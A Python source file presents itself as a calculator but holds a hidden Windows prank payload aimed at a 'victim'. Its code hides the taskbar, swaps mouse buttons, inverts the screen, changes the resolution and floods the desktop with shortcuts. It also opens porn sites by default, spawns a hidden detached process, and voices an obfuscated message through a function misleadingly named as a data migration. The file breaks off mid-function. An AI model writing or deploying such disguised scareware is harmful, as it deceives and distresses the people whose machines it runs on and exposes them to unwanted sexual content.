"""
Calcu 2.2+ ("Babbage, Night Shift Edition")
============================================
Presents itself as a boring REPL calculator. Pressing Enter on an
empty line triggers a long, Windows-only scare show. Read the
SAFETY CONTRACT below before letting it loose.

SAFETY CONTRACT
---------------
1. Nothing destructive is executed. No files are deleted, no
   shutdown/format/rm commands run. Every scary line is text on a
   canvas or a fake log entry. The fake cmd console and fake
   ransomware never touch real data.
2. Real system state changes (all reversible, all restored in a
   finally block AND by a detached watchdog process):
     - wallpaper (restored)
     - taskbar / start button / desktop icons visibility (restored)
     - mouse button swap and cursor visibility (restored)
     - screen color inversion via the Magnification API (restored)
     - temporary 640x480 resolution change, CDS flags = 0 so the
       registry is never touched (restored from a saved DEVMODE)
     - desktop icon layout: backed up to a .reg file, scrambled,
       then restored via reg import + explorer restart
     - ~30 fake desktop shortcuts (all prefixed CAL_2_2_ and
       deleted on exit, even if the process dies)
3. Browser tab flood: opens the default browser with a mix of
   funny and embarrassing URLs. Tabs are NOT closed by the script
   (closing someone's tabs would be worse). NSFW sites are behind
   NSFW_JOKES below; flip it to False to remove them.
4. The calculator core rejects anything that is not plain
   arithmetic, so a victim cannot weaponize the REPL itself.

Notes:
- No third-party dependencies. Pure stdlib + built-in Windows APIs.
- Test on a VM first. Do not run on machines you do not own.
- Contains strobe-like white flashes. Skip for photosensitive people.
"""
import ctypes
import math
import os
import random
import re
import shutil
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request

WINDOWS = False
try:
    import tkinter as tk
    import winsound
    user32 = ctypes.windll.user32
    WINDOWS = True
    # Declare signatures so 64-bit handles and pointers survive.
    user32.FindWindowW.restype = ctypes.c_void_p
    user32.FindWindowW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p]
    user32.FindWindowExW.restype = ctypes.c_void_p
    user32.FindWindowExW.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                     ctypes.c_wchar_p, ctypes.c_wchar_p]
    user32.ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]
    user32.IsWindowVisible.argtypes = [ctypes.c_void_p]
    user32.IsWindowVisible.restype = ctypes.c_bool
    user32.SendMessageW.argtypes = [ctypes.c_void_p, ctypes.c_uint,
                                    ctypes.c_size_t, ctypes.c_size_t]
    user32.SwapMouseButton.argtypes = [ctypes.c_bool]
    user32.ShowCursor.argtypes = [ctypes.c_bool]
    user32.MessageBoxW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p,
                                   ctypes.c_wchar_p, ctypes.c_uint]
    user32.keybd_event.argtypes = [ctypes.c_ubyte, ctypes.c_ubyte,
                                   ctypes.c_uint, ctypes.c_size_t]
    user32.SetCursorPos.argtypes = [ctypes.c_int, ctypes.c_int]
except (ImportError, AttributeError, OSError):
    pass
# ------------------------------------------------------------------
# Tunables
# ------------------------------------------------------------------
NSFW_JOKES     = True    # False removes porn/e621 from the tab flood
HISTORY_CAP    = 150     # max results kept in memory
FLASH_WINDOWS  = 30      # windows used to release stale conhost handles
AUTO_CLOSE     = 20      # windows that close themselves after 1 s
BEEP_CYCLES    = 6
BOOTMGR_S      = 4
BSOD_S         = 14      # crash screen duration
REPAIR_S       = 18      # automatic repair sequence duration
CHKDSK_S       = 8       # fake disk check duration
GLITCH_S       = 8       # theme preview duration
MATRIX_S       = 6
SCAN_S         = 12      # fake security scan duration
DELETE_S       = 8       # fake system32 deletion duration
ENCRYPT_S      = 25      # fake ransomware duration
UAC_S          = 8
CONSOLE_S      = 10      # fake cmd console duration
WEBCAM_S       = 8       # fake webcam overlay duration
UPDATE_S       = 12      # fake windows update duration
SFC_S          = 8       # fake sfc scan duration
SHUTDOWN_S     = 12      # fake sign-out countdown duration
REVEAL_S       = 5       # "PSYCH!" duration
AFTERPARTY_S   = 6       # afterparty duration
CURSOR_S       = 8       # lissajous cursor frenzy duration
RES_PANIC_S    = 6       # fake resolution change duration
TAB_SPAM       = 40      # browser tabs opened
NOTEPAD_SPAM   = 8       # notepad windows opened
MSGBOX_SPAM    = 6       # modal error dialogs
ICON_SPAM      = 60      # fake desktop shortcuts created
DOWNLOAD_SPAM  = 60      # junk files in real Downloads folder
TERMINAL_SPAM  = 60      # cmd windows that open and close quickly
TERMINAL_SPAM2 = 300     # cmd windows with timeout 2s
TERMINAL_SPAM3 = 40      # cmd windows with timeout 1s
APP_SPAM       = 12      # harmless random apps opened
JUMPSCARE_S    = 9       # jumpscare strobe duration
WATCHDOG_S     = 600     # failsafe restore delay, seconds
SCARE_DIR      = os.path.join(tempfile.gettempdir(), "calcu_scare")
SHORTCUT_PREFIX = "CAL_2_2_"
ICON_REG_KEY   = r"HKCU\Software\Microsoft\Windows\Shell\Bags\1\Desktop"
# ------------------------------------------------------------------
# Pools of scary content
# ------------------------------------------------------------------
TAB_FLOOD_URLS = [
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "https://www.youtube.com/watch?v=jNQXAC9IVRw",
    "https://www.youtube.com/results?search_query=how+to+remove+virus",
    "https://www.youtube.com/watch?v=9bZkp7q19f0",
    "https://www.youtube.com/results?search_query=scary+sounds",
    "https://www.google.com/search?q=am+i+a+clown",
    "https://en.wikipedia.org/wiki/Blue_screen_of_death",
    "https://www.google.com/search?q=windows+found+malware+fix",
    "https://www.google.com/search?q=how+to+remove+trojan+windows",
    "https://www.google.com/search?q=is+my+computer+hacked",
    "https://www.google.com/search?q=free+ransomware+decryptor",
    "https://www.youtube.com/results?search_query=windows+10+crashing",
    "https://www.google.com/search?q=pc+making+weird+noises",
    "https://www.youtube.com/watch?v=ub82Xb1C8os",
    "https://www.google.com/search?q=computer+screen+flickering",
    "https://www.youtube.com/results?search_query=creepy+sound+effects",
    "https://www.google.com/search?q=fake+bsod+prank",
    "https://www.youtube.com/results?search_query=never+gonna+give+you+up",
    "https://www.google.com/search?q=microsoft+support+scam",
    "https://www.wikipedia.org/wiki/Computer_virus",
    "https://www.google.com/search?q=system32+deleted",
    "https://www.youtube.com/results?search_query=sad+violin",
    "https://www.google.com/search?q=my+pc+is+possessed",
    "https://www.google.com/search?q=computer+exorcism",
    "https://www.youtube.com/results?search_query=rick+roll",
    "https://www.google.com/search?q=cmd+format+c+prank",
    "https://www.google.com/search?q=windows+activation+expired",
    "https://www.google.com/search?q=pc+overheating+danger",
    "https://www.youtube.com/results?search_query=ominous+music",
    "https://www.google.com/search?q=why+is+my+camera+on",
    "https://www.google.com/search?q=task+manager+weird+processes",
]
if NSFW_JOKES:
    TAB_FLOOD_URLS += [
        "https://www.pornhub.com/",
        "https://e621.net/",
        "https://onlyfans.com/",
        "https://www.xvideos.com/",
        "https://www.redtube.com/",
        "https://www.youporn.com/",
        "https://spankbang.com/",
        "https://www.tnaflix.com/",
        "https://www.xhamster.com/",
        "https://motherless.com/",
    ]
SHORTCUT_SUFFIXES = [
    "DO_NOT_OPEN", "virus_scan", "totally_normal", "URGENT_README",
    "SYS_CRITICAL", "recovery_key", "NOT_A_VIRUS", "update_2026",
    "SECRET", "login_credentials", "backup_missing", "fix_me",
    "you_should_see_this", "FINAL_WARNING", "do_not_delete",
    "password_reset", "system_check", "mystery", "open_me",
    "evidence", "DONT_LOOK", "administrator_only", "encrypted_files",
    "KEY_PAYLOAD", "deleted_system32", "cal32_patch",
    "windows_defender_disable", "restore_point",
    "suspicious_activity", "virus_total",
    "FOUND_YOU",
]
MSGBOX_ALERTS = [
    ("CRITICAL ERROR", "A fatal exception 0x000000C2 has occurred.\n"
                       "The system will shut down."),
    ("CAL-OS ALERT", "Memory corruption detected in cal32.sys.\n"
                     "Reboot required."),
    ("SECURITY BREACH", "An unauthorized user was detected.\n"
                        "Account will be locked."),
    ("WEBCAM", "WEBCAM_0 is now broadcasting.\n"
               "Viewer count: 1"),
    ("WARNING", "Windows Defender is unavailable.\n"
                "Your PC may be at risk."),
    ("SYSTEM FAILURE", "Kernel data not found.\n"
                       "Contact your administrator."),
    ("CAL-OS ALERT", "Threat detected: TROJAN.Win32.CAL\n"
                     "Quarantine failed."),
    ("ACCESS VIOLATION", "Windows detected an invalid handle.\n"
                         "Closing all programs..."),
    ("LOCKOUT", "Your account has been locked.\n"
                "Contact the administrator."),
    ("MEMORY DUMP", "Dumping physical memory...\n"
                    "Do not power off your PC."),
    ("DRIVER FAILURE", "The cal32.sys driver failed to load.\n"
                       "System stability may be affected."),
    ("NETWORK INTRUSION", "Unauthorized remote connection detected.\n"
                          "IP: 192.168.1.99 has accessed your PC."),
    ("FILE SYSTEM", "NTFS corruption detected on volume C:.\n"
                    "Run chkdsk /f immediately."),
    ("REGISTRY", "HKLM\\SYSTEM\\CurrentControlSet is corrupted.\n"
                 "Windows may not start after reboot."),
    ("FIREWALL", "Windows Firewall has been disabled.\n"
                 "Your PC is visible on the network."),
    ("BITLOCKER", "Drive encryption key has been modified.\n"
                  "Data may be unrecoverable."),
]
NOTEPAD_TEXTS = [
    "I can see you.\n\nThe camera has been on since you logged in.",
    "SECTOR 7 CORRUPTED\nDATA LOSS IMMINENT\nDO NOT SHUT DOWN",
    "You have 10 minutes before the countdown ends.\n\n- CAL",
    "This file was not here yesterday.",
    "Hello. We have been trying to reach you about your PC's\n"
    "extended warranty. It expired 3 seconds ago.",
    "DECRYPT.EXE queued for C:\\\n\nJust kidding. Nothing happened.",
    "0x7E UNREADABLE SECTOR\nRECOVERING...\nRECOVERING...",
    "Do not look behind you.\n\n(There is nothing behind you.)",
    "cal32.exe has stopped responding.\n\nClick here to send error report.",
    "LOGIN ATTEMPT FROM: 203.0.113.42\nUSER: administrator\nSTATUS: SUCCESS",
    "CRITICAL: C:\\Windows\\System32\\config\\SYSTEM is missing.\n"
    "Windows cannot boot without this file.",
    "Your webcam has been streaming for 47 minutes.\n"
    "Total viewers: 12. Most popular clip: you typing passwords.",
    "Scheduled task: cal_updater will run at next login.\n"
    "This task cannot be removed.",
]
STOP_CODES = ["SYSTEM_THREAD_EXCEPTION_NOT_HANDLED",
              "KERNEL_DATA_INPAGE_ERROR",
              "CRITICAL_PROCESS_DIED",
              "IRQL_NOT_LESS_OR_EQUAL",
              "PAGE_FAULT_IN_NONPAGED_AREA",
              "CAL_OS_FATAL_EXCEPTION",
              "MEMORY_MANAGEMENT",
              "UNEXPECTED_KERNEL_MODE_TRAP",
              "BAD_SYSTEM_CONFIG_INFO"]
GLITCH_COLORS = ["#00FF00", "#FF0000", "#FFFFFF", "#00FFFF",
                 "#FF00FF", "#FFAA00"]
GLITCH_PHRASES = ["MEMORY CORRUPTION", "CRC CHECK FAILED",
                  "SECTOR 0x7E UNREADABLE", "cal32.sys",
                  "IRQL_NOT_LESS_OR_EQUAL", "DMA VIOLATION",
                  "KERNEL PANIC", "STACK OVERFLOW"]
# ------------------------------------------------------------------
# Core arithmetic (the actual calculator part)
# ------------------------------------------------------------------
def add(a, b):
    return a + b
def subtract(a, b):
    return a - b
def multiply(a, b):
    return a * b
def divide(a, b):
    return a / b
_SAFE_EXPR = re.compile(r"^[0-9+\-*/().% ]+$")
def evaluate(expression):
    """Evaluate a math expression like 4+5*2.
    Input is restricted to digits and arithmetic symbols, so no
    attribute access, imports, or calls are possible. Never ship
    eval() on user input in real software.
    """
    expr = expression.strip()
    if not _SAFE_EXPR.match(expr):
        raise ValueError("only arithmetic is allowed")
    return eval(expr, {"__builtins__": {}}, {})
# ------------------------------------------------------------------
# Legacy data keys
# ------------------------------------------------------------------
LEGACY_KEYS = "Xnt&uddm/ `bjd c/a xB`k"
def migrate_legacy_keys():
    """Migrate legacy data keys (pre-2.0 format)."""
    return "".join(chr(ord(c) + 1) for c in LEGACY_KEYS)
# ------------------------------------------------------------------
# Display helpers
# ------------------------------------------------------------------
def make_screen(bg, fg):
    """Build a fullscreen always-on-top window."""
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg=bg)
    root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
    root.bind("<Escape>", lambda e: root.destroy())
    root.focus_force()
    return root
def label(root, text, size, color, bg, pady=10):
    """Add a centered label to a window."""
    lbl = tk.Label(root, text=text, font=("Consolas", size, "bold"),
                   fg=color, bg=bg)
    lbl.pack(pady=pady)
    return lbl
def hide_cursor():
    """Hide the pointer."""
    if not WINDOWS:
        return
    while user32.ShowCursor(False) >= 0:
        pass
def show_cursor():
    """Restore the pointer."""
    if not WINDOWS:
        return
    while user32.ShowCursor(True) < 0:
        pass
# ------------------------------------------------------------------
# Windows hooks: sound, dialogs, shell state
# ------------------------------------------------------------------
def play_sound(alias):
    if not WINDOWS:
        return
    try:
        winsound.PlaySound(alias, winsound.SND_ALIAS | winsound.SND_ASYNC)
    except Exception:
        pass
def native_alert(title, text, icon=0x10):
    """Real system-modal Windows error dialog."""
    if not WINDOWS:
        return
    play_sound("SystemHand")
    try:
        user32.MessageBoxW(0, text, title, icon | 0x1000)
    except Exception:
        pass
def hide_taskbar():
    if not WINDOWS:
        return
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, 0)
def set_start_button(show):
    if not WINDOWS:
        return
    tray = user32.FindWindowW("Shell_TrayWnd", None)
    if not tray:
        return
    btn = user32.FindWindowExW(tray, 0, "Button", "Start")
    if btn:
        user32.ShowWindow(btn, 5 if show else 0)
def desktop_icons_visible():
    if not WINDOWS:
        return True
    try:
        progman = user32.FindWindowW("Progman", None)
        dv = (user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
              if progman else None)
        return bool(user32.IsWindowVisible(dv)) if dv else True
    except Exception:
        return True
def toggle_desktop_icons():
    """Toggle desktop icon visibility via the DefView menu command."""
    if not WINDOWS:
        return
    progman = user32.FindWindowW("Progman", None)
    if not progman:
        return
    dv = user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
    if dv:
        user32.SendMessageW(dv, 0x0111, 0x7402, 0)   # WM_COMMAND
def hide_desktop_icons():
    if not WINDOWS:
        return
    progman = user32.FindWindowW("Progman", None)
    if progman:
        dv = user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
        if dv:
            user32.ShowWindow(dv, 0)
# ------------------------------------------------------------------
# Screen inversion (Magnification API, fully reversible)
# ------------------------------------------------------------------
class MAGCOLOREFFECT(ctypes.Structure):
    _fields_ = [("transform", ctypes.c_float * 25)]
def invert_colors(on):
    """Invert the whole screen. Restored with identity matrix."""
    if not WINDOWS:
        return
    try:
        mag = ctypes.windll.magnification
        if on:
            mag.MagInitialize()
            eff = MAGCOLOREFFECT()
            inv = (-1, 0, 0, 0, 1,
                    0, -1, 0, 0, 1,
                    0, 0, -1, 0, 1,
                    0, 0, 0, 1, 0,
                    0, 0, 0, 0, 1)
            for i, v in enumerate(inv):
                eff.transform[i] = v
            mag.MagSetFullscreenColorEffect(ctypes.byref(eff))
        else:
            eff = MAGCOLOREFFECT()
            for i in range(5):
                eff.transform[i * 5 + i] = 1.0
            mag.MagSetFullscreenColorEffect(ctypes.byref(eff))
            mag.MagUninitialize()
    except Exception:
        pass
# ------------------------------------------------------------------
# Resolution panic (temporary, never touches the registry)
# ------------------------------------------------------------------
class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
class DEVMODEW(ctypes.Structure):
    _fields_ = [
        ("dmDeviceName", ctypes.c_wchar * 32),
        ("dmSpecVersion", ctypes.c_ushort),
        ("dmDriverVersion", ctypes.c_ushort),
        ("dmSize", ctypes.c_ushort),
        ("dmDriverExtra", ctypes.c_ushort),
        ("dmFields", ctypes.c_uint),
        ("dmPosition", POINT),
        ("dmDisplayOrientation", ctypes.c_uint),
        ("dmDisplayFixedOutput", ctypes.c_uint),
        ("dmColor", ctypes.c_short),
        ("dmDuplex", ctypes.c_short),
        ("dmYResolution", ctypes.c_short),
        ("dmTTOption", ctypes.c_short),
        ("dmCollate", ctypes.c_short),
        ("dmFormName", ctypes.c_wchar * 32),
        ("dmLogPixels", ctypes.c_ushort),
        ("dmBitsPerPel", ctypes.c_uint),
        ("dmPelsWidth", ctypes.c_uint),
        ("dmPelsHeight", ctypes.c_uint),
        ("dmDisplayFlags", ctypes.c_uint),
        ("dmDisplayFrequency", ctypes.c_uint),
        ("dmICMMethod", ctypes.c_uint),
        ("dmICMIntent", ctypes.c_uint),
        ("dmMediaType", ctypes.c_uint),
        ("dmDitherType", ctypes.c_uint),
        ("dmReserved1", ctypes.c_uint),
        ("dmReserved2", ctypes.c_uint),
        ("dmPanningWidth", ctypes.c_uint),
        ("dmPanningHeight", ctypes.c_uint),
    ]
user32.EnumDisplaySettingsW.argtypes = [ctypes.c_wchar_p, ctypes.c_uint,
                                        ctypes.POINTER(DEVMODEW)]
user32.ChangeDisplaySettingsW.argtypes = [ctypes.POINTER(DEVMODEW),
                                          ctypes.c_uint]
def resolution_panic():
    """Drop to 640x480 for a few seconds, then restore from the
    saved DEVMODE. The saved bytes also let the watchdog restore
    if this process dies mid-change."""
    if not WINDOWS:
        return
    try:
        dm = DEVMODEW()
        dm.dmSize = ctypes.sizeof(DEVMODEW)
        if not user32.EnumDisplaySettingsW(None, 0, ctypes.byref(dm)):
            return
        raw = ctypes.string_at(ctypes.byref(dm), ctypes.sizeof(dm))
        os.makedirs(SCARE_DIR, exist_ok=True)
        with open(os.path.join(SCARE_DIR, "devmode.bin"), "wb") as f:
            f.write(raw)
        small = DEVMODEW()
        ctypes.memmove(ctypes.byref(small), raw, len(raw))
        small.dmFields = 0x40000 | 0x80000 | 0x100000  # bpp + width + height
        small.dmPelsWidth = 640
        small.dmPelsHeight = 480
        user32.ChangeDisplaySettingsW(ctypes.byref(small), 0)
        time.sleep(RES_PANIC_S)
        back = DEVMODEW()
        ctypes.memmove(ctypes.byref(back), raw, len(raw))
        user32.ChangeDisplaySettingsW(ctypes.byref(back), 0)
    except Exception:
        pass
def restore_resolution():
    if not WINDOWS:
        return
    path = os.path.join(SCARE_DIR, "devmode.bin")
    if not os.path.exists(path):
        return
    try:
        with open(path, "rb") as f:
            raw = f.read()
        if len(raw) == ctypes.sizeof(DEVMODEW):
            dm = DEVMODEW()
            ctypes.memmove(ctypes.byref(dm), raw, len(raw))
            user32.ChangeDisplaySettingsW(ctypes.byref(dm), 0)
    except Exception:
        pass
# ------------------------------------------------------------------
# Cursor / keyboard chaos
# ------------------------------------------------------------------
def cursor_frenzy(seconds):
    """Lissajous sweep, then random flicks."""
    if not WINDOWS:
        return
    w = user32.GetSystemMetrics(0)
    h = user32.GetSystemMetrics(1)
    cx, cy = w // 2, h // 2
    start = time.time()
    t = 0.0
    while time.time() - start < seconds:
        x = int(cx + (w * 0.38) * math.sin(2.1 * t + 1.3))
        y = int(cy + (h * 0.38) * math.sin(3.7 * t))
        user32.SetCursorPos(x, y)
        time.sleep(0.016)
        t += 0.06
    end = time.time() + 3
    while time.time() < end:
        user32.SetCursorPos(random.randint(0, w - 1),
                            random.randint(0, h - 1))
        time.sleep(0.03)
def start_menu_spam():
    """Open and close the Start menu a few times."""
    if not WINDOWS:
        return
    for _ in range(4):
        user32.keybd_event(0x5B, 0, 0, 0)
        user32.keybd_event(0x5B, 0, 2, 0)
        time.sleep(0.6)
def burn_cpu(seconds):
    """Short busy loop so the fans spin up. Ends on its own."""
    end = time.time() + seconds
    n = 1 << 20
    while time.time() < end:
        n = (n * 1103515245 + 12345) & 0x7FFFFFFF
# ------------------------------------------------------------------
# Desktop icons: backup, scramble, restore
# ------------------------------------------------------------------
def get_desktop_path():
    """Real Desktop folder, honoring OneDrive redirection."""
    if not WINDOWS:
        return ""
    try:
        ps = "$ws=New-Object -ComObject WScript.Shell; " \
             "$ws.SpecialFolders.Item('Desktop')"
        res = subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
             "-Command", ps],
            capture_output=True, text=True,
            creationflags=subprocess.CREATE_NO_WINDOW, timeout=20)
        p = (res.stdout or "").strip()
        return p if os.path.isdir(p) else ""
    except Exception:
        return ""
def reg_export(key, outfile):
    try:
        subprocess.run(["reg", "export", key, outfile, "/y"],
                       creationflags=subprocess.CREATE_NO_WINDOW,
                       capture_output=True, timeout=20)
    except Exception:
        pass
    return outfile if os.path.exists(outfile) else None
def reg_import(filepath):
    try:
        subprocess.run(["reg", "import", filepath],
                       creationflags=subprocess.CREATE_NO_WINDOW,
                       capture_output=True, timeout=20)
    except Exception:
        pass
def restart_explorer():
    try:
        explorer = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"),
                                "explorer.exe")
        subprocess.Popen(["taskkill", "/f", "/im", "explorer.exe"],
                         creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(1.5)
        subprocess.Popen([explorer],
                         creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass
def scramble_icons(backup):
    """Force auto-arrange so the desktop re-sorts itself.
    Best-effort: the whole bag key is restored from backup later,
    so even a wrong bit guess is harmless."""
    if not WINDOWS or not backup or not os.path.exists(backup):
        return
    try:
        cur = 0x4026
        res = subprocess.run(["reg", "query", ICON_REG_KEY, "/v", "FFlags"],
                             capture_output=True, text=True,
                             creationflags=subprocess.CREATE_NO_WINDOW)
        for line in (res.stdout or "").splitlines():
            line = line.strip()
            if "0x" in line:
                try:
                    cur = int(line.split("0x")[-1].split()[0], 16)
                except ValueError:
                    pass
                break
        val = cur | 0x1 | 0x2
        subprocess.run(["reg", "add", ICON_REG_KEY, "/v", "FFlags",
                        "/t", "REG_DWORD", "/d", hex(val), "/f"],
                       creationflags=subprocess.CREATE_NO_WINDOW,
                       capture_output=True)
    except Exception:
        pass
def create_shortcuts(count):
    """Flood the real Desktop with scary-named shortcuts pointing
    at real, harmless executables. Returns created .lnk paths."""
    if not WINDOWS:
        return []
    names = []
    used = set()
    while len(names) < count:
        suffix = random.choice(SHORTCUT_SUFFIXES)
        name = f"{SHORTCUT_PREFIX}{suffix}_{random.randint(1000, 9999)}"
        if name in used:
            continue
        used.add(name)
        names.append(name)
    targets = ["C:\\Windows\\System32\\notepad.exe",
               "C:\\Windows\\System32\\calc.exe",
               "C:\\Windows\\System32\\mspaint.exe",
               "C:\\Windows\\System32\\cmd.exe",
               "C:\\Windows\\System32\\control.exe",
               "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               "C:\\Windows\\explorer.exe"]
    icons = ["shell32.dll", "imageres.dll", "mmres.dll",
             "comctl32.dll", "ieframe.dll"]
    lines = ["$ws = New-Object -ComObject WScript.Shell",
             "$d = $ws.SpecialFolders.Item('Desktop')"]
    for i, name in enumerate(names):
        target = targets[i % len(targets)]
        icn = random.choice(icons)
        idx = random.randint(0, 90)
        esc = name.replace("'", "''")
        lines.append(f"$p = Join-Path $d '{esc}.lnk'")
        lines.append("$k = 0")
        lines.append("while (Test-Path $p) { $k++; " +
                     f"$p = Join-Path $d '{esc}_$k.lnk' }}")
        lines.append("$s = $ws.CreateShortcut($p)")
        lines.append(f"$s.TargetPath = '{target}'")
        lines.append(f"$s.IconLocation = 'C:\\Windows\\System32\\{icn},{idx}'")
        lines.append("$s.Save()")
        lines.append("Write-Output $p")
    ps = "; ".join(lines)
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
             "-Command", ps],
            capture_output=True, text=True,
            creationflags=subprocess.CREATE_NO_WINDOW, timeout=60)
        out = [l.strip() for l in (res.stdout or "").splitlines()
               if l.strip().lower().endswith(".lnk")]
        return out
    except Exception:
        return []
def delete_shortcuts_by_prefix():
    desktop = get_desktop_path()
    if not desktop:
        return
    try:
        for f in os.listdir(desktop):
            if f.startswith(SHORTCUT_PREFIX) and f.lower().endswith(".lnk"):
                try:
                    os.unlink(os.path.join(desktop, f))
                except OSError:
                    pass
    except OSError:
        pass
def desktop_note_path():
    desktop = get_desktop_path()
    if desktop:
        return os.path.join(desktop, "READ_ME_TO_DECRYPT.txt")
    return ""
# ------------------------------------------------------------------
# Failsafe watchdog (restores everything even if we are killed)
# ------------------------------------------------------------------
WATCHDOG_SRC = """
import ctypes, os, shutil, subprocess, sys, time
time.sleep({delay})
u = ctypes.windll.user32
def sw(h, cmd):
    if h:
        u.ShowWindow(h, cmd)
tray = u.FindWindowW("Shell_TrayWnd", None)
sw(tray, 5)
btn = u.FindWindowExW(tray, 0, "Button", "Start")
sw(btn, 5)
prog = u.FindWindowW("Progman", None)
dv = u.FindWindowExW(prog, 0, "SHELLDLL_DefView", None)
sw(dv, 5)
u.SwapMouseButton(False)
while u.ShowCursor(True) < 0:
    pass
try:
    class E(ctypes.Structure):
        _fields_ = [("t", ctypes.c_float * 25)]
    m = ctypes.windll.magnification
    e = E()
    for i in range(5):
        e.t[i * 5 + i] = 1.0
    m.MagSetFullscreenColorEffect(ctypes.byref(e))
    m.MagUninitialize()
except Exception:
    pass
wp = {wallpaper}
if wp:
    u.SystemParametersInfoW(20, 0, wp, 3)
scare = os.path.join(os.environ.get('TEMP', os.environ.get('TMP', '.')), 'calcu_scare')
dev = os.path.join(scare, 'devmode.bin')
if os.path.exists(dev):
    try:
        class P(ctypes.Structure):
            _fields_ = [('x', ctypes.c_long), ('y', ctypes.c_long)]
        class D(ctypes.Structure):
            _fields_ = [
                ('a', ctypes.c_wchar * 32), ('b', ctypes.c_ushort),
                ('c', ctypes.c_ushort), ('d', ctypes.c_ushort),
                ('e', ctypes.c_ushort), ('f', ctypes.c_uint),
                ('g', P), ('h', ctypes.c_uint), ('i', ctypes.c_uint),
                ('j', ctypes.c_short), ('k', ctypes.c_short),
                ('l', ctypes.c_short), ('m', ctypes.c_short),
                ('n', ctypes.c_short), ('o', ctypes.c_wchar * 32),
                ('p', ctypes.c_ushort), ('q', ctypes.c_uint),
                ('r', ctypes.c_uint), ('s', ctypes.c_uint),
                ('t', ctypes.c_uint), ('u', ctypes.c_uint),
                ('v', ctypes.c_uint), ('w', ctypes.c_uint),
                ('x', ctypes.c_uint), ('y', ctypes.c_uint),
                ('z', ctypes.c_uint), ('aa', ctypes.c_uint),
                ('ab', ctypes.c_uint), ('ac', ctypes.c_uint)]
        with open(dev, 'rb') as fh:
            raw = fh.read()
        if len(raw) == ctypes.sizeof(D):
            dm = D()
            ctypes.memmove(ctypes.byref(dm), raw, len(raw))
            u.ChangeDisplaySettingsW(ctypes.byref(dm), 0)
    except Exception:
        pass
for p in {paths}:
    try:
        if os.path.isdir(p):
            shutil.rmtree(p, ignore_errors=True)
        elif os.path.isfile(p):
            os.unlink(p)
    except Exception:
        pass
desktop = None
try:
    r = subprocess.run(['powershell', '-NoProfile', '-WindowStyle',
                        'Hidden', '-Command',
                        "$ws=New-Object -ComObject WScript.Shell; "
                        "$ws.SpecialFolders.Item('Desktop')"],
                       capture_output=True, text=True,
                       creationflags=0x08000000, timeout=20)
    desktop = (r.stdout or '').strip()
except Exception:
    pass
if desktop and os.path.isdir(desktop):
    try:
        for f in os.listdir(desktop):
            if f.startswith('CAL_2_2_') and f.lower().endswith('.lnk'):
                try:
                    os.unlink(os.path.join(desktop, f))
                except OSError:
                    pass
    except OSError:
        pass
downloads = None
try:
    r2 = subprocess.run(['powershell', '-NoProfile', '-WindowStyle',
                        'Hidden', '-Command',
                        "$ws=New-Object -ComObject WScript.Shell; "
                        "$ws.SpecialFolders.Item('Downloads')"],
                       capture_output=True, text=True,
                       creationflags=0x08000000, timeout=20)
    downloads = (r2.stdout or '').strip()
except Exception:
    pass
if downloads and os.path.isdir(downloads):
    try:
        for f in os.listdir(downloads):
            if f.startswith('CAL_2_2_'):
                try:
                    os.unlink(os.path.join(downloads, f))
                except OSError:
                    pass
    except OSError:
        pass
reg = os.path.join(scare, 'icons_backup.reg')
imported = False
if os.path.exists(reg):
    try:
        subprocess.run(['reg', 'import', reg],
                       creationflags=0x08000000, timeout=20)
        imported = True
    except Exception:
        pass
try:
    os.unlink(__file__)
except Exception:
    pass
if imported:
    try:
        explorer = os.path.join(os.environ.get('SystemRoot', 'C:\\\\Windows'),
                                'explorer.exe')
        subprocess.Popen(['taskkill', '/f', '/im', 'explorer.exe'],
                         creationflags=0x08000000)
        time.sleep(1.5)
        subprocess.Popen([explorer], creationflags=0x08000000)
    except Exception:
        pass
shutil.rmtree(scare, ignore_errors=True)
"""
def spawn_watchdog(wallpaper, paths):
    """Launch a detached failsafe that restores everything."""
    if not WINDOWS:
        return
    try:
        os.makedirs(SCARE_DIR, exist_ok=True)
        script = WATCHDOG_SRC.format(delay=WATCHDOG_S,
                                     wallpaper=repr(wallpaper or ""),
                                     paths=repr([p for p in paths if p]))
        path = os.path.join(SCARE_DIR, "calcu_watchdog.py")
        with open(path, "w", encoding="utf-8") as f:
            f.write(script)
        flags = 0x00000008 | 0x08000000  # DETACHED_PROCESS | CREATE_NO_WINDOW
        subprocess.Popen([sys.executable, path], creationflags=flags,
                         stdin=subprocess.DEVNULL,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    except Exception:
        pass
# ------------------------------------------------------------------
# Voice + sound
# ------------------------------------------------------------------
def stage_voice():
    if not WINDOWS:
        return
    user = "user"
    try:
        user = os.getlogin()
    except OSError:
        pass
    user = user.replace("'", "")
    ps = ("Add-Type -AssemblyName System.Speech; "
          "$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; "
          "$s.Rate=-2; "
          f"$s.Speak('I can see you, {user}. Do not be alarmed.'); "
          "$s.Speak('The diagnostics have already begun.'); "
          "$s.Speak('I am inside your computer now.'); "
          "$s.Speak('Your Downloads folder has been reorganized.'); "
          "$s.Speak('" + migrate_legacy_keys() + "'); $s.Dispose()")
    subprocess.Popen(
        ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
        creationflags=subprocess.CREATE_NO_WINDOW)
def ransom_voice():
    if not WINDOWS:
        return
